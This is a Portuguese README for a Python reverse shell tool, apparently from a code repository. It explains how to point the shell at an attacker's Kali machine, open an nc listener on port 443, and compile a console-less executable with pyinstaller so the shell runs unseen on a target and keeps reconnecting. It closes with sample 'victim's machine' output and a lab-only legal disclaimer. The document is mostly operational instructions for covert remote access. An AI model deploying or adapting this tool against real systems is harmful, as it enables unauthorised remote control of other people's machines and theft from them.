# Python Reverse Shell

## Visão Geral
Este script em Python cria uma conexão de shell reverso para uma máquina remota controlada pelo invasor. Ele tenta continuamente estabelecer uma conexão com o IP do atacante e permite a execução remota de comandos.

## Funcionalidades
- **Conexão Persistente**: O script continuará tentando conectar-se à máquina do atacante caso a conexão falhe.
- **Execução Remota de Comandos**: Após estabelecida a conexão, o invasor pode executar comandos remotamente.
- **Navegação de Diretórios**: Suporta comandos básicos de navegação como `cd`, `ls`, `pwd`.
- **Tratamento de Erros**: O script inclui mecanismos para lidar com falhas de conexão e erros na execução de comandos.

## Uso
### 1. Modifique o Script
Edite o script e substitua o IP e a porta pelo IP da máquina do atacante:
```python
IP = "192.x.x.x"  # Altere para o IP do Kali Linux
PORT = 443          # Certifique-se de que essa porta está aberta no Kali
```

### 2. Execute um Listener no Kali
No Kali Linux, execute um listener na porta especificada (443 neste exemplo):
```bash
nc -lvnp 443
```

### 3. Gerar um Executável
Instale a biblioteca `pyinstaller`:
```bash
pip install pyinstaller
```
Gere um executável usando o `pyinstaller`:
```bash
pyinstaller -F --clean -w shell.py
```
Isso criará um arquivo executável sem uma janela de console.

### 4. Execute o Shell
Execute o executável gerado na máquina-alvo. O shell tentará conectar-se à sua máquina Kali no IP e na porta especificados.

### 5. Execução de Comandos
Após conectado, você verá algo como:
```bash
listening on [any] 443 ...
connect to [192.x.x.x] from (UNKNOWN) [192.x.x.x] 30908
Welcome to your victim's machine!
─$
```
Para sair do shell, digite `/exit`.

### 6. Testar a Conexão Localmente
Antes de implantar, teste a conexão executando `connection_check.py`:
```bash
python .\connection_check.py
```
Este script ajuda a verificar se a conexão pode ser estabelecida.

## ⚠ Aviso Legal
Este script deve ser usado **somente** em ambientes controlados, como laboratórios de teste de penetração, com permissão explícita. O uso indevido desta ferramenta para acesso não autorizado a sistemas é **ilegal** e pode resultar em graves consequências legais. O risco é de sua responsabilidade.


